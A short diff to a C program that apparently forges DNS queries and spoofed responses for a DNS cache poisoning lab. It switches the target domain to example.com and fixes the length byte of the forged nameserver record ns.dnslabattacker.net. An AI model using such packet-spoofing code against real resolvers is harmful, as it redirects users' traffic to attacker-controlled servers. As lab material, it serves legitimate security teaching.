@@ -171,7 +171,7 @@ int main(int argc, char *argv[])
     dns->QDCOUNT=htons(1);
     
     //query string
-    strcpy(data,"\5aaaaa\7example\3edu");
+    strcpy(data,"\5aaaaa\7example\3com");
     int length= strlen(data)+1;
 
     //this is for convenience to get the struct type write the 4bytes in a more organized way.
@@ -194,7 +194,7 @@ int main(int argc, char *argv[])
     dns_res->ARCOUNT=htons(2);        
     
     //query string
-    strcpy(data_res,"\5aaaaa\7example\3edu");
+    strcpy(data_res,"\5aaaaa\7example\3com");
     int length_res= strlen(data_res)+1;
 
     //this is for convenience to get the struct type write the 4bytes in a more organized way.
@@ -227,10 +227,10 @@ int main(int argc, char *argv[])
     end_res_ns->datalen=htons(23);
     length_res+=10;
     
-    strcpy(data_res+length_res, "\2ns\14dnslabattacker\3net");
+    strcpy(data_res+length_res, "\2ns\16dnslabattacker\3net");
     length_res+=23;
 
-    strcpy(data_res+length_res, "\2ns\14dnslabattacker\3net");
+    strcpy(data_res+length_res, "\2ns\16dnslabattacker\3net");
     length_res+=23;
     
     struct sesEnd * end_res_add = (struct sesEnd *)(data_res+length_res);
